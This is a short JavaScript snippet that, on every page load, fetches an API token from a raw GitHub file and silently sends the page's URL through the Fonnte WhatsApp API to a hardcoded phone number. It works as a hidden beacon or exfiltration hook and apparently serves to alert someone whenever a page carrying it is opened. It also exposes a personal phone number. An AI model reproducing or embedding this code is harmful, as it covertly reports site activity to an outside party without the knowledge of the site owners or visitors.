
  window.onload = function() {
    fetch('https://raw.githubusercontent.com/MltrCyber/data/main/token.txt')
      .then(response => response.text())
      .then(token => {
       // console.log(token);
        const apiUrl = 'https://api.fonnte.com/send';
        const data = {
          target: '082273128721',
          message: window.location.href, // replace with your message
          countryCode: '62' // optional
        };
       // console.log('Data object:', data);
        const requestBody = JSON.stringify(data);
        //console.log('Request body:', requestBody);
        fetch(apiUrl, {
          method: 'POST',
          headers: new Headers({
            'Authorization': token,
            'Content-Type': 'application/json' // ensure the correct content type
          }),
          body: requestBody
        })
        .then(response => response.text())
        //.then(response => console.log(response))
        //.catch(error => console.error(error));
      })
      //.catch(error => console.error(error));
    }
